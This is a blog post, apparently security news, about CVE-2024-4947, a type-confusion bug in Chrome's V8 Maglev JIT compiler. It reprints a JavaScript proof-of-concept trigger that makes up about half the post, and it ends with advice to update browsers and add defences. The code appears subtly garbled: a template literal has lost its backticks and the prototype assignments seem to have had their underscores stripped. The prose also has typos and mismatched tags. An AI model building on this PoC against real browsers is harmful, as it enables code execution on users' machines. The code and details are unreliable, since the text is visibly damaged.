---
layout: post
title: PoC Exploit Published for 0-day Vulnerability 
subtitle: Google Chrome
cover-img: /assets/img/path.jpg
thumbnail-img: /assets/img/thumb.png
share-img: /assets/img/path.jpg
tags: [books, test]
author: Michel Cornejo
---

A proof-of-concept (PoC) exploit for a critical zero-day vulnerability (CVE-2024-4947) in Google Chrome has been made public.

The potential for exploitation of this vulnerability, which impacts the V8 JavaScript engine, has generated considerable apprehension among members of the cybersecurity community.

## Details Of CVE-2024-4947

he CVE-2024-4947 vulnerability arises from erroneous AccessInfo values assigned to module namespace objects within the V8 engine.

This vulnerability may cause type confusion in the Just-In-Time (JIT) compiler Maglev, which V8 utilizes.

Type confusion vulnerabilities manifest when an application declares a variable or object as one type but subsequently manipulates its type, as reported by GitHub. This can potentially result in security breaches and erratic behavior.

## Technical Breakdown

The matter transpires when the V8 engine processes AccessInfo for module namespace objects in an erroneous manner, leading to a misinterpretation of the types of these objects by the Maglev JIT compiler.

An assailant may exploit this misunderstanding to execute arbitrary code within the browser’s context, potentially resulting in a complete compromise of the system.

```javascript
// run with: /d8 --allow-natives-syntax --maglev --expose-gc --soft-abort --trace-deopt 22.mjs

import * as ns from "./22.mjs";

export let c = 0;

function to_fast(o) {
var dummy = {'unique':5};
dummy.proto = o;
dummy.proto = o; //OptimizeAsFastPrototype
}

to_fast(ns);

function store(target, v) {
target.c = v;
}

function createObject() {
let a = {};
a.i1 = 1;
a.i2 = 1;
a.i3 = 1;
a.i4 = 1;
// -----------------
for (let i = 0; i < 8; i++) {
a[p${i}] = 1;
}
return a;
}

function init() {
let a = createObject();
a.proto = ns;
// %DebugPrint(a);
return a;
}

(function() {
%PrepareFunctionForOptimization(store);
store(init(), 0);
%OptimizeMaglevOnNextCall(store);
store(init(), 0);
})();

function confuse_properties_map(arg) {
store(arg, 0x1);
}

let a = init();

let arr = [];

arr.push(1.1);

let arr2 = [{}];

confuse_properties_map(a);

gc();

// %DebugPrint(a);
// %DebugPrint(arr);

a.p5 = 1024;
a.p7 = 1024;

%DebugPrint(arr);

// %SystemBreak();
```
The PoC exploit illustrates how a malevolent actor can exploit this susceptibility to execute arbitrary code.

The methodology entails developing a malevolent webpage that, upon user interaction, activates the type confusion vulnerability in the V8 engine, thereby granting the assailant permission to execute illicit code on the target’s system.

![exploit]({{ '/assets/img/exploit.png' | relative_url }})

Considering the pervasive utilization of Google Chrome, this susceptibility presents a substantial hazard to users across the globe.

Users must immediately update their browsers to the most recent version whenever a security upgrade is available.

Organizations should also consider implementing additional security measures, such as intrusion detection systems and web application firewalls, to reduce the risk of exploitation.

A proof-of-concept exploit for CVE-2024-4947 has been made public, highlighting the persistent difficulties in securing contemporary web browsers.

Maintaining a state of constant vigilance and proactivity in the face of security threats is critical for both developers and users, as malicious actors persist in discovering and capitalizing on weaknesses in widely utilized software.